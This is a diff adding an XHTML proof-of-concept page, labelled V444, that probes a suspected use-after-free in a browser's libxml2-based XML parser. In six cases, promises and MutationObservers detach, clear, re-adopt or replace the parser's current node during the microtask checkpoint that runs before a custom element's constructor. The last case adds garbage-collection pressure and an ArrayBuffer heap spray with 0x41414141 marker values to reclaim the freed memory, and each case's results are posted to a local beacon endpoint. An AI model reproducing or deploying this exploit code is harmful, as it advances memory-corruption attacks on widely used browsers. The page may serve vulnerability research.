@@ -1,0 +1,442 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>V444</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<script type="text/javascript"><![CDATA[
+// V444: XHTML microtask-checkpoint UAF probe
+//
+// XMLDocumentParserLibxml2.cpp:822 — performMicrotaskCheckpoint() fires
+// BEFORE createElement at :826 and BEFORE CE constructor at :842.
+// Safety check at :858 runs AFTER constructor but doesn't verify:
+//   - m_currentNode is still in the live DOM tree
+//   - m_currentNode's children were not modified
+//   - m_currentNode wasn't adopted to another document and back
+//
+// Target: trigger DOM mutations in resolved Promises/MutationObservers
+// that fire during the microtask checkpoint, corrupting parser state
+// that the safety check doesn't cover.
+
+var BQ = 0;
+function B(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/beacon/V444-" + tag + "?q=" + (BQ++), false);
+    x.setRequestHeader("Content-Type", "text/plain");
+    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
+  } catch(e) {}
+}
+
+B("BOOT");
+
+var ceLog = [];
+var frCallbacks = [];
+
+if (typeof customElements === "undefined") {
+  B("ABORT", "no-CE-API");
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// T1: Promise removes m_currentNode from DOM during microtask checkpoint
+// ═══════════════════════════════════════════════════════════════════
+// m_currentNode (raw ContainerNode*) points to t1-parent.
+// Promise fires at :822 and removes t1-parent from DOM.
+// Safety check at :858: !m_currentNode (not null, parser has ref) → passes.
+// Parser then appends new element to DETACHED t1-parent.
+//
+// After popCurrentNode for t1-parent, if refcount=0 → freed → subsequent
+// access to children parented there = dangling.
+
+var t1Saved = null;
+var t1PromiseFired = false;
+
+class T1CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T1-ctor");
+    // By the time constructor runs, m_currentNode has already been
+    // detached by the Promise that fired at :822
+    try {
+      var p = document.getElementById("t1-parent");
+      ceLog.push("T1-parent-exists=" + !!p);
+      ceLog.push("T1-parent-connected=" + (p ? p.isConnected : "null"));
+    } catch(e) { ceLog.push("T1-ctor-err:" + e.message.slice(0,40)); }
+  }
+}
+customElements.define("t1-ce", T1CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T2: Promise adopts m_currentNode to iframe doc, then back
+// ═══════════════════════════════════════════════════════════════════
+// Double-adoption changes node's ownerDocument temporarily.
+// Any side effects (event listeners, CE callbacks, scope changes)
+// that occurred during foreign-document ownership persist.
+// Safety check at :858 sees documents match (adopted back) → passes.
+
+var t2AdoptedAway = false;
+var t2AdoptedBack = false;
+
+class T2CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T2-ctor");
+    ceLog.push("T2-adoptedAway=" + t2AdoptedAway);
+    ceLog.push("T2-adoptedBack=" + t2AdoptedBack);
+  }
+}
+customElements.define("t2-ce", T2CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T3: Promise does innerHTML="" on m_currentNode (clears children)
+// ═══════════════════════════════════════════════════════════════════
+// Parser had already appended children to m_currentNode before
+// encountering this CE. innerHTML="" destroys those children.
+// Parser continues with m_currentNode that has fewer children than
+// expected. When parser pops these "ghost" nodes, it derefs them
+// but they were already freed by innerHTML.
+
+var t3InnerHTMLDone = false;
+
+class T3CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T3-ctor");
+    ceLog.push("T3-innerHTML=" + t3InnerHTMLDone);
+    try {
+      var p = document.getElementById("t3-parent");
+      ceLog.push("T3-kids=" + (p ? p.childNodes.length : "null"));
+    } catch(e) { ceLog.push("T3-ctor-err:" + e.message.slice(0,40)); }
+  }
+}
+customElements.define("t3-ce", T3CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T4: FR + GC during microtask — test if parser-held nodes can be collected
+// ═══════════════════════════════════════════════════════════════════
+
+var t4FRFired = false;
+var t4GCDone = false;
+
+class T4CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T4-ctor");
+    ceLog.push("T4-fr=" + t4FRFired);
+  }
+}
+customElements.define("t4-ce", T4CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T5: MutationObserver fires during microtask, replaces m_currentNode
+// ═══════════════════════════════════════════════════════════════════
+// MO callback fires during performMicrotaskCheckpoint at :822.
+// It removes m_currentNode and inserts a CLONE at the same position.
+// Parser's raw pointer still references the OLD (removed) node.
+// Safety check doesn't verify identity, only null/document/parent.
+
+var t5MOFired = false;
+var t5Replaced = false;
+var mo5 = null;
+
+class T5CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T5-ctor");
+    ceLog.push("T5-mo=" + t5MOFired);
+    ceLog.push("T5-replaced=" + t5Replaced);
+    try {
+      var p = document.getElementById("t5-parent");
+      ceLog.push("T5-parent-connected=" + (p ? p.isConnected : "null"));
+    } catch(e) { ceLog.push("T5-ctor-err:" + e.message.slice(0,40)); }
+  }
+}
+customElements.define("t5-ce", T5CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T6: Promise removes m_currentNode + GC + AB spray (UAF test)
+// ═══════════════════════════════════════════════════════════════════
+// Most aggressive: remove m_currentNode from DOM, heavy GC, spray ABs
+// to reuse the freed node's memory. If parser later accesses stale
+// m_currentNode, it hits AB data → type confusion / crash.
+
+var t6PromiseFired = false;
+var t6SprayDone = false;
+var t6ABs = [];
+
+class T6CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("T6-ctor");
+    ceLog.push("T6-promise=" + t6PromiseFired);
+    ceLog.push("T6-spray=" + t6SprayDone);
+  }
+}
+customElements.define("t6-ce", T6CE);
+
+]]></script>
+</head>
+<body>
+
+<!-- ═══ T1: Remove m_currentNode via resolved Promise ═══ -->
+<div id="t1-outer">
+  <div id="t1-parent">
+    <div id="t1-before">before</div>
+    <script type="text/javascript"><![CDATA[
+    // Queue a resolved Promise JUST before parser encounters t1-ce
+    // It fires during performMicrotaskCheckpoint at :822
+    Promise.resolve().then(function() {
+      t1PromiseFired = true;
+      ceLog.push("T1-promise-fire");
+      try {
+        var p = document.getElementById("t1-parent");
+        if (p && p.parentNode) {
+          t1Saved = p;
+          p.parentNode.removeChild(p);
+          ceLog.push("T1-parent-removed");
+        }
+      } catch(e) { ceLog.push("T1-promise-err:" + e.message.slice(0,40)); }
+    });
+    ]]></script>
+    <t1-ce id="t1-elem">t1-content</t1-ce>
+    <div id="t1-after">after</div>
+  </div>
+</div>
+
+<!-- ═══ T2: Adopt m_currentNode to iframe and back ═══ -->
+<iframe id="t2-iframe" style="display:none" />
+<div id="t2-outer">
+  <div id="t2-parent">
+    <div id="t2-before">before</div>
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("T2-promise-fire");
+      try {
+        var p = document.getElementById("t2-parent");
+        var iframe = document.getElementById("t2-iframe");
+        if (p && iframe && iframe.contentDocument) {
+          var foreignDoc = iframe.contentDocument;
+          // Adopt to foreign document
+          foreignDoc.adoptNode(p);
+          t2AdoptedAway = true;
+          ceLog.push("T2-adopted-away;doc=" + (p.ownerDocument === foreignDoc));
+          // Adopt back to original
+          document.adoptNode(p);
+          t2AdoptedBack = true;
+          ceLog.push("T2-adopted-back;doc=" + (p.ownerDocument === document));
+          // Re-insert into original position
+          var outer = document.getElementById("t2-outer");
+          if (outer) outer.appendChild(p);
+          ceLog.push("T2-reinserted");
+        } else {
+          ceLog.push("T2-skip;p=" + !!p + ";iframe=" + !!iframe);
+        }
+      } catch(e) { ceLog.push("T2-promise-err:" + e.message.slice(0,40)); }
+    });
+    ]]></script>
+    <t2-ce id="t2-elem">t2-content</t2-ce>
+  </div>
+</div>
+
+<!-- ═══ T3: innerHTML="" on m_currentNode destroys parser-appended children ═══ -->
+<div id="t3-outer">
+  <div id="t3-parent">
+    <div id="t3-child-a">child-a</div>
+    <div id="t3-child-b">child-b</div>
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("T3-promise-fire");
+      try {
+        var p = document.getElementById("t3-parent");
+        if (p) {
+          var kidsBefore = p.childNodes.length;
+          p.textContent = "";
+          t3InnerHTMLDone = true;
+          ceLog.push("T3-cleared;before=" + kidsBefore + ";after=" + p.childNodes.length);
+        }
+      } catch(e) { ceLog.push("T3-promise-err:" + e.message.slice(0,40)); }
+    });
+    ]]></script>
+    <t3-ce id="t3-elem">t3-content</t3-ce>
+    <div id="t3-child-c">child-c</div>
+  </div>
+</div>
+
+<!-- ═══ T4: FR + GC during microtask ═══ -->
+<div id="t4-outer">
+  <div id="t4-parent">
+    <script type="text/javascript"><![CDATA[
+    // Create a disposable node, register FR, remove from DOM
+    var t4Disposable = document.createElement("div");
+    document.getElementById("t4-parent").appendChild(t4Disposable);
+    var t4FR = new FinalizationRegistry(function(val) {
+      t4FRFired = true;
+      ceLog.push("T4-FR-FIRED=" + val);
+    });
+    t4FR.register(t4Disposable, "t4-node");
+    t4Disposable.parentNode.removeChild(t4Disposable);
+    t4Disposable = null; // Drop JS ref
+
+    Promise.resolve().then(function() {
+      ceLog.push("T4-promise-fire");
+      // Heavy GC pressure during microtask checkpoint
+      for (var i = 0; i < 50000; i++) { new ArrayBuffer(256); }
+      t4GCDone = true;
+      ceLog.push("T4-gc-done");
+    });
+    ]]></script>
+    <t4-ce id="t4-elem">t4-content</t4-ce>
+  </div>
+</div>
+
+<!-- ═══ T5: MutationObserver replaces m_currentNode during microtask ═══ -->
+<div id="t5-outer">
+  <div id="t5-parent">
+    <div id="t5-watched">watched</div>
+    <script type="text/javascript"><![CDATA[
+    if (typeof MutationObserver !== "undefined") {
+      var t5w = document.getElementById("t5-watched");
+      mo5 = new MutationObserver(function(mutations) {
+        t5MOFired = true;
+        ceLog.push("T5-MO-fire");
+        try {
+          var p = document.getElementById("t5-parent");
+          if (p && p.parentNode) {
+            var outer = p.parentNode;
+            var clone = p.cloneNode(false);
+            clone.id = "t5-parent-clone";
+            // Replace m_currentNode with a clone
+            outer.replaceChild(clone, p);
+            t5Replaced = true;
+            ceLog.push("T5-replaced;old-connected=" + p.isConnected + ";clone-connected=" + clone.isConnected);
+          }
+        } catch(e) { ceLog.push("T5-MO-err:" + e.message.slice(0,40)); }
+      });
+      mo5.observe(t5w, { childList: true });
+      // Trigger mutation — MO fires during next microtask checkpoint
+      t5w.appendChild(document.createTextNode("trigger"));
+      ceLog.push("T5-MO-armed");
+    }
+    ]]></script>
+    <t5-ce id="t5-elem">t5-content</t5-ce>
+    <div id="t5-after">after</div>
+  </div>
+</div>
+
+<!-- ═══ T6: Remove + GC + AB spray (aggressive UAF attempt) ═══ -->
+<div id="t6-outer">
+  <div id="t6-parent">
+    <div id="t6-before-a">a</div>
+    <div id="t6-before-b">b</div>
+    <div id="t6-before-c">c</div>
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      t6PromiseFired = true;
+      ceLog.push("T6-promise-fire");
+      try {
+        var p = document.getElementById("t6-parent");
+        if (p && p.parentNode) {
+          // Remove from DOM — only parser's pushCurrentNode ref remains
+          p.parentNode.removeChild(p);
+          ceLog.push("T6-removed");
+
+          // Drop all children references (parser already popped them)
+          p.textContent = "";
+          ceLog.push("T6-children-cleared");
+
+          // Heavy GC
+          for (var i = 0; i < 50000; i++) { new ArrayBuffer(512); }
+          ceLog.push("T6-gc-pressure");
+
+          // AB spray to reuse freed memory
+          t6ABs = [];
+          for (var j = 0; j < 200; j++) {
+            var ab = new ArrayBuffer(64);
+            var dv = new DataView(ab);
+            // Write marker pattern: 0x41414141 at offset 0
+            dv.setUint32(0, 0x41414141, true);
+            dv.setUint32(4, 0x42424242, true);
+            t6ABs.push(ab);
+          }
+          t6SprayDone = true;
+          ceLog.push("T6-spray-done=" + t6ABs.length);
+        }
+      } catch(e) { ceLog.push("T6-promise-err:" + e.message.slice(0,40)); }
+    });
+    ]]></script>
+    <t6-ce id="t6-elem">t6-content</t6-ce>
+    <div id="t6-after-a">after-a</div>
+    <div id="t6-after-b">after-b</div>
+  </div>
+</div>
+
+<!-- ═══ Report ═══ -->
+<script type="text/javascript"><![CDATA[
+B("PARSED");
+B("CE-LOG", ceLog.join("|"));
+
+// Individual results
+B("T1", JSON.stringify({
+  promiseFired: t1PromiseFired,
+  parentExists: !!document.getElementById("t1-parent"),
+  parentConnected: t1Saved ? t1Saved.isConnected : "no-ref",
+  elemExists: !!document.getElementById("t1-elem"),
+  afterExists: !!document.getElementById("t1-after")
+}));
+
+B("T2", JSON.stringify({
+  adoptedAway: t2AdoptedAway,
+  adoptedBack: t2AdoptedBack,
+  parentExists: !!document.getElementById("t2-parent"),
+  elemExists: !!document.getElementById("t2-elem")
+}));
+
+B("T3", JSON.stringify({
+  cleared: t3InnerHTMLDone,
+  parentKids: (function() { var p = document.getElementById("t3-parent"); return p ? p.childNodes.length : -1; })(),
+  childAExists: !!document.getElementById("t3-child-a"),
+  childBExists: !!document.getElementById("t3-child-b"),
+  childCExists: !!document.getElementById("t3-child-c"),
+  elemExists: !!document.getElementById("t3-elem")
+}));
+
+B("T4", JSON.stringify({
+  frFired: t4FRFired,
+  gcDone: t4GCDone
+}));
+
+B("T5", JSON.stringify({
+  moFired: t5MOFired,
+  replaced: t5Replaced,
+  origExists: !!document.getElementById("t5-parent"),
+  cloneExists: !!document.getElementById("t5-parent-clone"),
+  elemExists: !!document.getElementById("t5-elem"),
+  afterExists: !!document.getElementById("t5-after")
+}));
+
+B("T6", JSON.stringify({
+  promiseFired: t6PromiseFired,
+  sprayDone: t6SprayDone,
+  parentExists: !!document.getElementById("t6-parent"),
+  elemExists: !!document.getElementById("t6-elem"),
+  afterAExists: !!document.getElementById("t6-after-a")
+}));
+
+// Crash detection: if we got here, no crash
+B("ALIVE", "all-tests-completed");
+
+// DOM integrity check
+try {
+  var body = document.body;
+  B("INTEGRITY", JSON.stringify({
+    bodyExists: !!body,
+    bodyKids: body ? body.childNodes.length : -1,
+    docElement: !!document.documentElement
+  }));
+} catch(e) {
+  B("INTEGRITY-ERR", e.message.slice(0,60));
+}
+
+B("DONE");
+]]></script>
+</body>
+</html>
